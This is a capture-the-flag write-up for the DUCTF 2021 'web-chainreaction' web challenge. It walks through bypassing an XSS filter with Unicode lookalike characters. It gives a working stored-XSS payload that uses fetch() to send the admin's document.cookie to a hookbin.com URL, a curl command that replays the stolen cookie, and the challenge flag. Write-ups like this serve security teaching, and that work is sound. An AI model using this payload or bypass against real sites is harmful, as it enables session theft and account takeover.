#### Challenge:

A bunch of university students want to start a company and hired some young university students. I wonder if they paid any attention to security. [web-chainreaction](https://web-chainreaction-a4b5ae3b.chal-2021.duc.tf/)

---

#### Solution:

- login screen reveals `dev` discussion regarding the issues that page has [devchat](https://web-chainreaction-a4b5ae3b.chal-2021.duc.tf/devchat) based on that we need to forge `XSS` with `unicode` characters
- for capturing of the admin cookie we will use [hookbin](https://hookbin.com/) service
  - 1. create new user `fixme`
  - 2. update its name to `﹤ˢcrⁱpt﹥fetch("https://hookb.in/lJlj19M1d9TJBNooBNpq?c="+document.cookie)﹤/ˢcrⁱpt﹥`
  - 3. report an error to admin
  - 4. check the `hookbin` service for admin cookie

```bash
curl https://web-chainreaction-a4b5ae3b.chal-2021.duc.tf/admin --cookie 'admin-cookie=sup3rs3cur34dm1nc00k13' | grep -i ductf
```

---

<details><summary>FLAG:</summary>

```
DUCTF{_un1c0de_bypass_x55_ftw!}
```

</details>
<br/>
